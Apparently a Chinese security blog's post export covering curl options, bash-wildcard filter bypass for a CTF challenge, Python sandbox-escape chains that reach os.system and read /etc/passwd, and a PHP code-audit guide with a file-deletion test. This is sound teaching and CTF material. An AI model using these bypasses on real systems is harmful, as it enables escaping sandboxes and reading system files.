HOST[:PORT] 在指定的端口上使用 HTTP/1.0 代理 -p, --proxytunnel 使用HTTP代理 (用于 CONNECT) --pubkey KEY 公钥文件名 (SSH) -Q, --quote CMD 在传输开始前向服务器发送命令 (F/SFTP) --random-file FILE 读取随机数据的文件 (SSL) -r, --range RANGE 仅检索范围内的字节 --raw 使用原始HTTP传输，而不使用编码 (H) -e, --referer Referer URL (H) -J, --remote-header-name 从远程文件读取头信息 (H) -O, --remote-name 将输出写入远程文件 --remote-name-all 使用所有URL的远程文件名 -R, --remote-time 将远程文件的时间设置在本地输出上 -X, --request COMMAND 使用指定的请求命令 --resolve HOST:PORT:ADDRESS 将 HOST:PORT 强制解析到 ADDRESS --retry NUM 出现问题时的重试次数 --retry-delay SECONDS 重试时的延时时长 --retry-max-time SECONDS 仅在指定时间段内重试 -S, --show-error 显示错误. 在选项 -s 中，当 curl 出现错误时将显示 -s, --silent Silent模式。不输出任务内容 --socks4 HOST[:PORT] 在指定的 host + port 上使用 SOCKS4 代理 --socks4a HOST[:PORT] 在指定的 host + port 上使用 SOCKSa 代理 --socks5 HOST[:PORT] 在指定的 host + port 上使用 SOCKS5 代理 --socks5-hostname HOST[:PORT] SOCKS5 代理，指定用户名、密码 --socks5-gssapi-service NAME 为gssapi使用SOCKS5代理服务名称 --socks5-gssapi-nec 与NEC Socks5服务器兼容 -Y, --speed-limit RATE 在指定限速时间之后停止传输 -y, --speed-time SECONDS 指定时间之后触发限速. 默认 30 --ssl 尝试 SSL/TLS (FTP, IMAP, POP3, SMTP) --ssl-reqd 需要 SSL/TLS (FTP, IMAP, POP3, SMTP) -2, --sslv2 使用 SSLv2 (SSL) -3, --sslv3 使用 SSLv3 (SSL) --ssl-allow-beast 允许的安全漏洞，提高互操作性(SSL) --stderr FILE 重定向 stderr 的文件位置. - means stdout --tcp-nodelay 使用 TCP_NODELAY 选项 -t, --telnet-option OPT=VAL 设置 telnet 选项 --tftp-blksize VALUE 设备 TFTP BLKSIZE 选项 (必须 &gt;512) -z, --time-cond TIME 基于时间条件的传输 -1, --tlsv1 使用 =&gt; TLSv1 (SSL) --tlsv1.0 使用 TLSv1.0 (SSL) --tlsv1.1 使用 TLSv1.1 (SSL) --tlsv1.2 使用 TLSv1.2 (SSL) --trace FILE 将 debug 信息写入指定的文件 --trace-ascii FILE 类似 --trace 但使用16进度输出 --trace-time 向 trace/verbose 输出添加时间戳 --tr-encoding 请求压缩传输编码 (H) -T, --upload-file FILE 将文件传输（上传）到指定位置 --url URL 指定所使用的 URL -B, --use-ascii 使用 ASCII/text 传输 -u, --user USER[:PASSWORD] 指定服务器认证用户名、密码 --tlsuser USER TLS 用户名 --tlspassword STRING TLS 密码 --tlsauthtype STRING TLS 认证类型 (默认 SRP) --unix-socket FILE 通过这个 UNIX socket 域连接 -A, --user-agent STRING 要发送到服务器的 User-Agent (H) -v, --verbose 显示详细操作信息 -V, --version 显示版本号并退出 -w, --write-out FORMAT 完成后输出什么 --xattr 将元数据存储在扩展文件属性中 -q .curlrc 如果作为第一个参数无效]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bash通配符与命令执行]]></title>
    <url>%2F2019%2F02%2F14%2Fbash%E9%80%9A%E9%85%8D%E7%AC%A6%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[关于bash通配符有以下几个 ?是匹配一个任意字符.也就是说如果我们平时执行的是cat /etc/passwd可以用?来替代 例如： root@bee-box:~# which ls /bin/ls root@bee-box:~# echo /???/?s /bin/ls /bin/ps /sys/fs root@bee-box:~# 可以用/???/?s来取代.类似的cat也是可以用/???/??t或者/???/c?t等来查找到.如果在绕waf的过程里面应该是可以直接拿出来用的. root@bee-box:~# echo /???/c?t /bin/cat root@bee-box:~# echo /???/??t /bin/cat /dev/net /etc/apt /etc/opt /etc/rmt /var/opt 试试常见的cat /etc/passwd我们用/???/??t /???/??ss??来替换 cat /etc/passwd /???/??t /???/??ss?? 可以看到达到了同样的效果 在安恒月赛里出现过一道题目： 12345678910111213141516&lt;?phpinclude 'flag.php';if(isset($_GET['code']))&#123; $code = $_GET['code']; if(strlen($code)&gt;35)&#123; die("Long."); &#125; if(preg_match("/[A-Za-z0-9_$]+/",$code))&#123; die("NO."); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;//$hint = "php function getFlag() to get flag";?&gt; 字母和数字都被过滤了，我们就可以利用上面的特性 /???/??? =&gt; /bin/cat 详细的wp在安全客:https://www.anquanke.com/post/id/160582?from=singlemessage]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python沙箱逃逸小结]]></title>
    <url>%2F2019%2F02%2F12%2FPython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[在各个技术平台浏览了许多Python沙箱逃逸的问题，这里自己记录一下 Python 沙盒所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。 Python 沙箱逃逸的一些套路导入模块Python 的内建函数中，有一些函数可以帮助我们实现任意命令执行： os.system() os.popen() commands.getstatusoutput() commands.getoutput() commands.getstatus() subprocess.call(command, shell=True) subprocess.Popen(command, shell=True) pty.spawn() 在 Python 中导入模块的方法通常有三种（xxx 为模块名称）： import xxx from xxx import * __import__(&apos;xxx&apos;) 我们可以通过上述的导入方法，导入相关模块并使用上述的函数实现命令执行。 除此之外，我们也可以通过路径引入模块： 如在 linux 系统中 Python 的 os 模块的路径一般都是在 /usr/lib/python2.7/os.py，当知道路径的时候，我们就可以通过如下的操作导入模块，然后进一步使用相关函数。 &gt;&gt;&gt; import sys &gt;&gt;&gt; sys.modules[&apos;os&apos;]=&apos;/usr/lib/python2.7/os.py&apos; &gt;&gt;&gt; import os &gt;&gt;&gt; 其他的危险函数举例 如 execfile 文件执行 &gt;&gt;&gt; execfile(&apos;/usr/lib/python2.7/os.py&apos;) &gt;&gt;&gt; system(&apos;cat /etc/passwd&apos;) root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin ... &gt;&gt;&gt; getcwd() &apos;/usr/lib/python2.7&apos; timeit import timeit timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;,number=1) exec 和 eval eval(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;) platform import platform print platform.popen(&apos;dir&apos;).read() 正常的 Python 沙箱会以黑名单的形式禁止使用一些模块如 os 或以白名单的形式只允许用户使用沙箱提供的模块，用以阻止用户的危险操作。下面讨论一下这种情况下应该如何进行绕过 Python 的内建函数&gt;&gt;&gt; dir(__builtins__) [&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;ZeroDivisionError&apos;, &apos;_&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;] 通过该命令我们可以获取内置函数的列表 禁用import的绕过在Python里，这段[].class.mro[-1].subclasses()魔术代码，不用import任何模块，但可调用任意模块的方法。 查看Python版本 Python2.x和Python3.x有一些区别，Bypass前最好知道Python版本。 我们知道，sys.version可以查看python版本。 &gt;&gt;&gt; import sys &gt;&gt;&gt; sys.version globals该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os,sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals 属性访问全局的变量 &gt;&gt;&gt; a = lambda x:x+1 &gt;&gt;&gt; dir(a) [&apos;__call__&apos;, &apos;__class__&apos;, &apos;__closure__&apos;, &apos;__code__&apos;, &apos;__defaults__&apos;, &apos;__delattr__&apos;, &apos;__dict__&apos;, &apos;__doc__&apos;, &apos;__format__&apos;, &apos;__get__&apos;, &apos;__getattribute__&apos;, &apos;__globals__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__module__&apos;, &apos;__name__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;func_closure&apos;, &apos;func_code&apos;, &apos;func_defaults&apos;, &apos;func_dict&apos;, &apos;func_doc&apos;, &apos;func_globals&apos;, &apos;func_name&apos;] &gt;&gt;&gt; a.__globals__ {&apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None, &apos;a&apos;: &lt;function &lt;lambda&gt; at 0x7fcd7601ccf8&gt;, &apos;__package__&apos;: None} &gt;&gt;&gt; a.func_globals {&apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None, &apos;a&apos;: &lt;function &lt;lambda&gt; at 0x7f1095d72cf8&gt;, &apos;__package__&apos;: None} (lambda x:1).__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).system(&apos;ls&apos;)&quot;) _globals__ 是一个字典，默认有builtins对象，在python sandbox中一般会过滤builtins内容，这样globals里面的builtins也就没有什么意义了,即使重新import builtin 还是一样. 执行系统命令在python2.7.10里，[].class.base.subclasses() 里面有很多库调用了我们需要的模块os /usr/lib/python2.7/warning.py 58 &lt;class &apos;warnings.WarningMessage&apos;&gt; 59 &lt;class &apos;warnings.catch_warnings&apos;&gt; /usr/lib/python2.7/site.py 71 &lt;class &apos;site._Printer&apos;&gt; 72 &lt;class &apos;site._Helper&apos;&gt; 76 &lt;class &apos;site.Quitter&apos;&gt; 我们来看一下/usr/lib/python2.7/warning.py导入的模块 import linecache import sys import types 跟踪linecache文件/usr/lib/python2.7/linecache.py import sysimport os 于是一个利用链就可以构造了: [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;ls&apos;) [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].system(&apos;ls&apos;)]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[置顶-项目发布-莫离新版授权系统]]></title>
    <url>%2F2019%2F02%2F11%2F%E7%BD%AE%E9%A1%B6-%E9%A1%B9%E7%9B%AE%E5%8F%91%E5%B8%83-%E8%8E%AB%E7%A6%BB%E6%96%B0%E7%89%88%E6%8E%88%E6%9D%83%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[该项目已发布到各大论坛，公益作品请勿盗用二开 本系统可作为多款产品的网络验证程序，对接性灵活，UI界面取自原生彩虹登录界面 系统支持添加代理商和高级代理商 更换授权信息时需要进行主人身份验证，大大增强了系统的安全性 默认添加机器人对接接口，其他程序对接自行修改根目录下的yunsq.php文件即可 配置方法： 数据库信息配置文件请修改 includes\config.php 然后导入install.sql 超级管理员后台路径为 /qq80743522/login.php 代理商与高级代理商后台路径为 /user/login.php 项目地址：https://github.com/yemoli/yemoli-auth]]></content>
      <tags>
        <tag>项目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP常用魔术方法]]></title>
    <url>%2F2019%2F02%2F11%2FPHP%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[PHP将所有以 __ （两个下划线）开头的类方法保留为魔术方法。下面记录一下常用的魔术方法： __sleep在使用 serialize() 函数时，程序会检查类中是否存在一个 __sleep() 魔术方法。如果存在，则该方法会先被调用，然后再执行序列化操作。 __wakeup在使用 unserialize() 时，会检查是否存在一个 __wakeup() 魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。 __toString__toString() 方法用于定义一个类被当成字符串时该如何处理。 123456789101112131415161718&lt;?phpclass TestClass&#123; public $foo; public function __construct($foo) &#123; $this-&gt;foo = $foo; &#125; public function __toString() &#123; return $this-&gt;foo; &#125;&#125;$class = new TestClass('Hello');echo $class; // 运行结果：Hello?&gt; __invoke1234567891011&lt;?phpclass CallableClass &#123; function __invoke($x) &#123; var_dump($x); &#125;&#125;$obj = new CallableClass;$obj(5);var_dump(is_callable($obj));?&gt; __construct具有 __construct 函数的类会在每次创建新对象时先调用此方法，适合在使用对象之前做一些初始化工作。 __destruct__destruct 函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行 __set给不可访问属性赋值时，__set() 会被调用。 __get读取不可访问属性的值时，__get() 会被调用。 __isset对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。 __unset对不可访问属性调用 unset() 时，__unset() 会被调用。 __call在对象中调用一个不可访问方法时，__call() 会被调用。 123456789101112131415&lt;?phpclass MethodTest&#123; public function __call($name, $arguments)&#123; // Note: value of $name is case sensitive. echo "Triggering __call method when calling method '$name' with arguments '" . implode(', ', $arguments). "'.\n"; &#125;&#125;$obj = new MethodTest;$obj-&gt;callTest('arg1','arg2');/*运行结果Triggering __call method when calling method 'callTest' with arguments 'arg1, arg2'.*/?&gt; __callStatic在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用。 12345678910111213&lt;?phpclass MethodTest&#123; public static function __callStatic($name, $arguments)&#123; // Note: value of $name is case sensitive. echo "Triggering __call method when calling method '$name' with arguments '" . implode(', ', $arguments). "'.\n"; &#125;&#125;MethodTest::callStaticTest('arg3','arg4'); // As of PHP 5.3.0/*运行结果Triggering __call method when calling method 'callStaticTest' with arguments 'arg3, arg4'.*/?&gt;]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[转载-PHP代码审计]]></title>
    <url>%2F2019%2F02%2F09%2F%E8%BD%AC%E8%BD%BD-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[代码审计（Code audit）是一种以发现程序错误，安全漏洞和违反程序规范为目标的源代码分析。 学习代码审计的目标是能够独立完成对代码安全监测。其通用的思路有： 通读全文代码，从功能函数代码开始阅读，例如include文件夹下的common_fun.php，或者有类似关键字的文件。 看配置文件，带有config关键字的文件，找到mysql.class.php文件的connect()函数，查看在数据库连接时是否出现漏洞。 继续跟读首页文件index.php，了解程序运作时调用了哪些函数和文件 以index.php文件作为标线，一层一层去扩展阅读所包含的文件，了解其功能，之后进入其功能文件夹的首页文件，进行扩展阅读。 一、输入输出验证用户的一切输入都是有害的，大多数漏洞的形成原因主要都是未对输入数据进行安全验证或对输出数据未经过安全处理。 所以我们需要针对输入输出数据进行以下的安全检查： 对数据进行精确匹配 接受白名单的数据 拒绝黑名单的数据 对匹配黑名单的数据进行编码 在PHP中，能够由用户输入的变量有： 12345678910111213$_SERVER$_GET$_POST$_COOKIE$_REQUEST$_FILES$_ENV$_HTTP_COOKIE_VARS$_HTTP_ENV_VARS$_HTTP_GET_VARS$_HTTP_POST_FILES$_HTTP_POST_VARS$_HTTP_SERVER_VARS 我们需要针对这些函数进行必要的安全检查。 1. XSS反射型XSS出现在接受用户提交的变量后进行处理，直接输出显示给酷护短，存储型XSS出现在用户提交的变量进行处理后存储到数据库中，再从数据库中读取这条信息输出到客户端。 对于反射型XSS，应当在当前的PHP页面检查变量被提交时是否经过了安全检查，是否在当前的PHP页面有立即显示。 对于存储型XSS，首先对于输入的数据进行安全检查后再写入数据库，在输出显示时是否有安全检查。 防御策略： 对输入的数据进行严格的匹配，过滤所有的非法字符进行过滤。 对于输出的数据进行HTML编码， 123456789&lt; → &amp;lt;&gt; → &amp;gt;( → &amp;#40;) → &amp;#41;# → &amp;#35&amp; → &amp;amp;" → &amp;quot;’ → &amp;apos;` → %60 2.SQL注入SQL注入关系到的是数据库安全，所以对于用户的恶意输入必须做严格的过滤。 在SQL注入攻击中，一般会用到 ’、select、insert、delete、from、=、in、update等关键字，需要针对这些字符进行过滤，要查看传递的变量参数是否用户可控制，以及它们是否做到安全检查。 防御策略： 使用参数化查询 3. 文件上传任意文件上传可能会造成网站getshell，也是一个非常危险的功能，对于文件上传也需要非常警惕。 PHP的文件上传通常会使用move_uploaded_file()函数，在文件上传的位置也需要进行上传文件的检测，做好安全检查。 防御策略： 使用白名单检测上传文件后缀。 上传后随机生成文件名称。 上传目录限制文件不可执行。 注意防范%00进行的截断。 4. 文件包含文件包含漏洞可以读取敏感文件，配合文件上传功能可以得到webshell,远程文件包含可以直接远程包含shell。 PHP可能出现文件包含的函数：include、include_once、require、require_once、show_source、highlight_file、readfile、file_get_contents、fopen、file。 防御策略： 对输入数据进行精确匹配。 过滤参数中的/、..等字符。 5. 命令注入php执行系统命令可以使用以下几个函数：system、exec、passthru、“、shell_exec、popen、proc_open、pcntl_exec。 我们通过在全部程序文件中搜索这些函数，确定函数的参数是否会因为外部提交而改变，检查这些参数是否有经过安全处理。 防御策略： 使用自定义函数或函数库来替代外部命令的功能。 使用escapeshellarg函数来处理命令参数。 使用safe_mode_exec_dir指定可执行文件的路径。 6. 代码注入PHP可能出现代码注入的函数：eval、preg_replace+/e、assert、call_user_func、call_user_func_array、create_function。 查找程序中程序中使用这些函数的地方，检查提交变量是否用户可控，有无做输入验证 防御策略： 输入数据精确匹配。 使用白名单过滤可执行的函数。 7. 文件管理PHP的用于文件管理的函数，如果输入变量可由用户提交，程序中也没有做数据验证，可能成为高危漏洞。我们应该在程序中搜索如下函数：copy、rmdir、unlink、delete、fwrite、chmod、fgetc、 fgetcsv、fgets、fgetss、file、file_get_contents、fread、readfile、ftruncate、 file_put_contents、fputcsv、fputs，但通常PHP中每一个文件操作函数都可能是危险的。 防御策略： 对提交数据进行严格匹配。 限定文件可操作的目录。 8. 变量覆盖PHP的变量覆盖会出现在以下集中情况： 遍历初始化变量 函数覆盖变量parse_str、mb_parse_str、import_request_variables 3.Register_globals=ON时，GET方式提交变量会直接覆盖 防御策略： 设置Register_globals=OFF。 不使用覆盖变量的函数来获取变量。 二、会话安全1. HTTPOnly设置打开该指令可以有效预防通过XSS攻击劫持会话ID。 2. domain设置检查session.cookie_domain是否只包含本域，如果是父域，则其他子域能够获取本域的cookies。 3. path设置检查session.cookie_path，如果网站本身应用在/app，则path必须设置为/app/，才能保证安全。 4. cookies持续时间检查session.cookie_lifetime，如果时间设置过程过长，即使用户关闭浏览器，攻击者也会危害到帐户安全。 5. secure设置如果使用HTTPS，那么应该设置session.cookie_secure=ON，确保使用HTTPS来传输cookies。 6. session固定如果当权限级别改变时（例如核实用户名和密码后，普通用户提升到管理员），我们就应该修改即将重新生成的会话ID，否则程序会面临会话固定攻击的风险。 7. CSRF跨站请求伪造攻击，是攻击者伪造一个恶意请求链接，通过各种方式让正常用户访问后，会以用户的身份执行这些恶意的请求。我们应该对比较重要的程序模块，比如修改用户密码，添加用户的功能进行审查，检查有无使用一次性令牌防御csrf攻击。 三、加密1. 明文存储密码采用明文的形式存储密码会严重威胁到用户、应用程序、系统安全。 2. 密码弱加密使用容易破解的加密算法，MD5加密已经部分可以利用md5破解网站来破解。 3. 密码存储在攻击者能访问到的文件例如：保存密码在txt、ini、conf、inc、xml等文件中，或者直接写在HTML注释中。 四、认证和授权1. 用户认证检查代码进行用户认证的位置，是否能够绕过认证，例如：登录代码可能存在表单注入。 检查登录代码有无使用验证码等，防止暴力破解的手段。 2. 函数或文件的未认证调用一些管理页面是禁止普通用户访问的，有时开发者会忘记对这些文件进行权限验证，导致漏洞发生 某些页面使用参数调用功能，没有经过权限验证，比如index.php?action=upload。 3. 密码硬编码有的程序会把数据库链接账号和密码，直接写到数据库链接函数中。 五、PHP危险函数1. 缓冲区溢出（1）confirm_phpdoc_compiled 影响版本： phpDocumentor phpDocumentor 1.3.1 phpDocumentor phpDocumentor 1.3 RC4 phpDocumentor phpDocumentor 1.3 RC3 phpDocumentor phpDocumentor 1.2.3 phpDocumentor phpDocumentor 1.2.2 phpDocumentor phpDocumentor 1.2.1 phpDocumentor phpDocumentor 1.2 （2）mssql_pconnect/mssql_connect 影响版本：PHP &lt; = 4.4.6 （3）crack_opendict 影响版本：PHP = 4.4.6 （4）snmpget 影响版本：PHP &lt;= 5.2.3 （5）ibase_connect 影响版本：PHP = 4.4.6 （6）unserialize 影响版本：PHP 5.0.2、PHP 5.0.1、PHP 5.0.0、PHP 4.3.9、PHP 4.3.8、PHP 4.3.7、PHP 4.3.6、PHP 4.3.3、PHP 4.3.2、PHP 4.3.1、PHP 4.3.0、PHP 4.2.3、PHP 4.2.2、PHP 4.2.1、PHP 4.2.0、PHP 4.2-dev、PHP 4.1.2、PHP 4.1.1、PHP 4.1.0、PHP 4.1、PHP 4.0.7、PHP 4.0.6、PHP 4.0.5、PHP 4.0.4、PHP 4.0.3pl1、PHP 4.0.3、PHP 4.0.2、PHP 4.0.1pl2、PHP 4.0.1pl1、PHP 4.0.1 2. session_destroy()删除文件漏洞影响版本：不祥，需要具体测试。 测试代码如下： 123456789101112&lt;?phpsession_save_path('./');session_start();if($_GET['del']) &#123;session_unset();session_destroy();&#125;else&#123;$_SESSION['do']=1;echo(session_id());print_r($_SESSION);&#125;?&gt; 当我们提交cookieHPSESSIONID=/../1.php，相当于删除了此文件。 3. unset()-zend_hash_del_key_or_index漏洞zend_hash_del_key_or_index PHP4小于4.4.3和PHP5小于5.1.3，可能会导致zend_hash_del删除了错误的元素。当PHP的unset()函数被调用时，它会阻止变量被unset。 六、信息泄露phpinfo()如果攻击者可以浏览到程序中调用phpinfo显示的环境信息，会为进一步攻击提供便利。 七、PHP环境1. open_basedir设置open_basedir能限制应用程序能访问的目录，检查有没有对open_basedir进行设置，当然有的通过web服务器来设置，例如：apache的php_admin_value，nginx+fcgi通过conf来控制php设置。 2. allow_url_fopen设置如果allow_url_fopen=ON，那么php可以读取远程文件进行操作，这个容易被攻击者利用。 3. allow_url_include设置如果allow_url_include=ON，那么php可以包含远程文件，会导致严重漏洞。 4. safe_mode_exec_dir设置这个选项能控制php可调用的外部命令的目录，如果PHP程序中有调用外部命令，那么指定外部命令的目录，能控制程序的风险。 5. magic_quote_gpc设置这个选项能转义提交给参数中的特殊字符，建议设置magic_quote_gpc=ON。 6. register_globals设置开启这个选项，将导致php对所有外部提交的变量注册为全局变量，后果相当严重。 7. safe_mode设置safe_mode是PHP的重要安全特性，建议开启。 8. session_use_trans_sid设置如果启用 session.use_trans_sid，会导致 PHP 通过 URL 传递会话 ID，这样一来，攻击者就更容易劫持当前会话，或者欺骗用户使用已被攻击者控制的现有会话。 9. display_errors设置如果启用此选项，PHP将输出所有的错误或警告信息，攻击者能利用这些信息获取web根路径等敏感信息。 10. expose_php设置如果启用 expose_php 选项，那么由 PHP 解释器生成的每个响应都会包含主机系统上所安装的 PHP 版本。了解到远程服务器上运行的 PHP 版本后，攻击者就能针对系统枚举已知的盗取手段，从而大大增加成功发动攻击的机会。]]></content>
      <tags>
        <tag>转载文章</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP简介]]></title>
    <url>%2F2019%2F02%2F08%2FHTTP%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[内容转自博客园 HTTP简介HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。 HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。 HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。 HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。 主要特点1、简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。 2、灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。 3.无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。 4.无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。5、支持B/S及C/S模式。 HTTP之URLHTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息 URL,全称是UniformResourceLocator, 中文叫统一资源定位符,是互联网上用来标识某一处资源的地址。以下面这个URL为例，介绍下普通URL的各部分组成： http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name 从上面的URL可以看出，一个完整的URL包括以下几部分：1.协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符 2.域名部分：该URL的域名部分为“www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用 3.端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口 4.虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/” 5.文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名 6.锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分 7.参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。 